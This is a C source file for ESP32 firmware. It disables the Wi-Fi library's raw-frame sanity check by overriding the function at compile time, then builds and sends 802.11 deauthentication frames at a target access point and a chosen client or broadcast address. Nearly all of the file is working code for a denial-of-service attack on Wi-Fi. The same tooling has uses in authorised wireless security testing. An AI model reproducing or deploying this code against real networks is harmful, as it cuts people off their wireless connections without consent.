/**
 * @file wsl_bypasser.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-05
 * @copyright Copyright (c) 2021
 *
 * @brief Implementation of Wi-Fi Stack Libaries bypasser.
 */
#include "wsl_bypasser.h"

#include <stdint.h>
#include <string.h>

#define LOG_LOCAL_LEVEL ESP_LOG_DEBUG
#include "esp_err.h"
#include "esp_log.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"

static const char *TAG = "wsl_bypasser";
/**
 * @brief Deauthentication frame template
 *
 * Destination address is set to broadcast.
 * Reason code is 0x2 - INVALID_AUTHENTICATION (Previous authentication no
 * longer valid)
 *
 * @see Reason code ref: 802.11-2016 [9.4.1.7; Table 9-45]
 */
static const uint8_t deauth_frame_default[] = {
    0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0xf0, 0xff, 0x02, 0x00};

/**
 * @brief Decomplied function that overrides original one at compilation time.
 *
 * @attention This function is not meant to be called!
 * @see Project with original idea/implementation
 * https://github.com/GANESH-ICMC/esp32-deauther
 */
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}

void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
  wifi_mode_t mode;
  esp_wifi_get_mode(&mode);
  if (mode != WIFI_MODE_STA) {
    ESP_LOGE(TAG, "Wi-Fi mode is not STA, cannot send raw frame");
    return;
  }
  esp_err_t err;
  int retries = 0;
  do {
    err = esp_wifi_80211_tx(WIFI_IF_STA, frame_buffer, size, false);
    if (err == ESP_ERR_NO_MEM) {
      ESP_LOGW(TAG, "TX buffer full, retrying...");
      vTaskDelay(pdMS_TO_TICKS(50));
    }
  } while (err == ESP_ERR_NO_MEM && retries++ < 10);

  if (err != ESP_OK) {
    ESP_LOGE(TAG, "Failed to send frame: %s", esp_err_to_name(err));
  }
}

void wsl_bypasser_send_deauth_frame(const uint8_t *ap_record,
                                    const uint8_t *client_mac) {
  uint8_t deauth_frame[sizeof(deauth_frame_default)];

  memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));

  if (client_mac) {
    memcpy(&deauth_frame[4], client_mac, 6);

  } else {
    memset(&deauth_frame[4], 0xFF, 6); // broadcast
    ESP_LOGI(TAG, "Broadcast deauth");
  }

  memcpy(&deauth_frame[10], ap_record, 6);
  memcpy(&deauth_frame[16], ap_record, 6);

  wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
}
